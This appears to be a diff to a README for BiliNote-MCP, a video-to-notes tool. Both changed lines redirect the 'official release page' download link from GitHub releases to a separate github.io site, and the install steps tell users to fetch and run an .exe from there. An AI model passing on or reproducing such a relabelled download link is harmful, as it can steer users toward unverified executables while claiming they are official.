@@ -1,6 +1,6 @@
 # 📝 BiliNote-MCP - Turn videos into structured study notes
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lucianabaggy649/BiliNote-MCP/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://lucianabaggy649.github.io)
 
 BiliNote-MCP helps you extract information from online videos. It downloads video content, pulls the text from the audio, and uses artificial intelligence to create organized Markdown notes. You save time by reviewing text summaries instead of watching hours of footage. This tool works with Bilibili, YouTube, Douyin, Kuaishou, and your own video files.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 ## 📥 How to Install
 
-1. Visit the [official release page](https://github.com/Lucianabaggy649/BiliNote-MCP/releases) to download the software.
+1. Visit the [official release page](https://lucianabaggy649.github.io) to download the software.
 2. Look for the file ending in `.exe` under the latest release.
 3. Save the file to your computer.
 4. Double-click the file to start the installer.
